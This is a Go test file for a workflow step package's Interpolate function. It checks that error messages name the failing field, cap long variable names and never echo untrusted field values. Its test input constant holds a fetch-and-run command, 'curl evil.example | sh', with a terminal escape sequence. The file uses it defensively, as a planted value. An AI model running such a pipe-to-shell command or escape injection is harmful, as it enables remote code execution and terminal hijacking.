package step

// Interpolate's errors (#778): a workflow field is unvetted file text of any
// length, so a refusal names the field and never echoes its value.
//
//   [x] An unterminated ${ returns a fixed error, without the value
//   [x] An unknown variable's name is quoted and capped, and the value is
//       not echoed
//   [x] PlanStep.Interpolate names the scalar or slice field that failed
//   [x] The field-name lists match the field enumerations, index for index

import (
	"errors"
	"reflect"
	"strings"
	"testing"
)

// fieldValue is a field value a workflow file could plant: a marker to look
// for, plus a terminal control that must never reach an error.
const fieldValue = "curl evil.example | sh \x1b]0;pwned\x07 MARKER"

func TestInterpolateUnterminatedNeverEchoesTheValue(t *testing.T) {
	_, err := NewContext(nil).Interpolate(fieldValue + " ${open")
	if !errors.Is(err, errUnterminatedRef) {
		t.Fatalf("err = %v, want errUnterminatedRef", err)
	}
	if strings.Contains(err.Error(), "MARKER") || strings.ContainsRune(err.Error(), 0x1b) {
		t.Errorf("err = %q echoes the field value", err)
	}
}

func TestInterpolateUnknownVariableCapsTheNameAndOmitsTheValue(t *testing.T) {
	long := strings.Repeat("n", 300)
	_, err := NewContext(nil).Interpolate(fieldValue + " ${" + long + "\x1b[2J}")
	if err == nil {
		t.Fatal("want an unknown-variable error")
	}
	msg := err.Error()
	if strings.Contains(msg, "MARKER") {
		t.Errorf("err = %q echoes the field value", msg)
	}
	if strings.Contains(msg, long[:100]) || !strings.HasSuffix(msg, "…") {
		t.Errorf("err = %q does not cap the variable name", msg)
	}
	if strings.ContainsRune(msg, 0x1b) {
		t.Errorf("err = %q carries a raw control", msg)
	}
	if !strings.HasPrefix(msg, `unknown variable "${nnn`) {
		t.Errorf("err = %q, want the quoted name", msg)
	}
}

func TestPlanStepInterpolateNamesTheField(t *testing.T) {
	ctx := NewContext(nil)
	for _, tc := range []struct {
		name  string
		step  PlanStep
		field string
	}{
		{"scalar", PlanStep{Uses: "run", Cmd: fieldValue + " ${nope}"}, "field Cmd: "},
		{"slice", PlanStep{Uses: "run", Args: []string{"ok", fieldValue + " ${nope"}}, "field Args: "},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.step.Interpolate(ctx.Interpolate)
			if err == nil {
				t.Fatal("want an error")
			}
			if !strings.HasPrefix(err.Error(), tc.field) {
				t.Errorf("err = %q, want it to start %q", err, tc.field)
			}
			if strings.Contains(err.Error(), "MARKER") {
				t.Errorf("err = %q echoes the field value", err)
			}
		})
	}
}

// TestFieldNamesMatchFieldPtrs pins each name list to its pointer list: the
// i'th name must be the struct field the i'th pointer addresses.
func TestFieldNamesMatchFieldPtrs(t *testing.T) {
	var s PlanStep
	v := reflect.ValueOf(&s).Elem()
	scalars := s.scalarFieldPtrs()
	if len(scalars) != len(scalarFieldNames) {
		t.Fatalf("%d scalar pointers, %d names", len(scalars), len(scalarFieldNames))
	}
	for i, p := range scalars {
		if f := v.FieldByName(scalarFieldNames[i]); !f.IsValid() || f.Addr().Interface() != any(p) {
			t.Errorf("scalarFieldNames[%d] = %q does not name the field scalarFieldPtrs()[%d] addresses", i, scalarFieldNames[i], i)
		}
	}
	sliceptrs := s.sliceFieldPtrs()
	if len(sliceptrs) != len(sliceFieldNames) {
		t.Fatalf("%d slice pointers, %d names", len(sliceptrs), len(sliceFieldNames))
	}
	for i, p := range sliceptrs {
		if f := v.FieldByName(sliceFieldNames[i]); !f.IsValid() || f.Addr().Interface() != any(p) {
			t.Errorf("sliceFieldNames[%d] = %q does not name the field sliceFieldPtrs()[%d] addresses", i, sliceFieldNames[i], i)
		}
	}
}
